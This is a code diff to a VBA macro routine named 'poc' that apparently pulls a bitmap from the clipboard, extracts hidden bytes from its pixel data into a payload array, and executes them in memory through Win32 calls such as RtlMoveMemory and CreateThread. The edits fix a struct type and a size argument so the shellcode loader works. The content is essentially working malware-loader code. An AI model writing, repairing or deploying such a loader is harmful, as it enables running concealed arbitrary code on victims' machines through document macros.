@@ -8,7 +8,7 @@ Private Declare Function GetClipboardData Lib "user32" (ByVal wFormat As Integer
 Private Declare Function CloseClipboard Lib "user32" () As Long
 Private Declare Function CopyImage Lib "user32" (ByVal handle As Long, ByVal un1 As Long, ByVal n1 As Long, ByVal n2 As Long, ByVal un2 As Long) As Long
 
-Private Declare Function GetObjectA Lib "Gdi32" (ByVal handle As Long, ByVal c As Long, ByRef pv As BITMAP) As Long
+Private Declare Function GetObjectA Lib "Gdi32" (ByVal handle As Long, ByVal c As Long, ByRef pv As BITMAP86) As Long
 
 Private Declare Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
 Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
@@ -48,7 +48,7 @@ Sub poc()
     hKeyboard = CloseClipboard
 
     Dim lBmBitsSize As Long
-    lResult = GetObjectA(hBitmap, 24, Bmp)
+    lResult = GetObjectA(hBitmap, Len(Bmp), Bmp)
 
     Dim lRowLength As Long, bBmBitsArr() As Byte
     
@@ -87,7 +87,6 @@ Sub poc()
                     bPayloadArr(lBytePos) = 0
                     
                     Run VarPtr(bPayloadArr(0)), lPayloadSize
-                    
                     Exit Sub
                 End If
                 
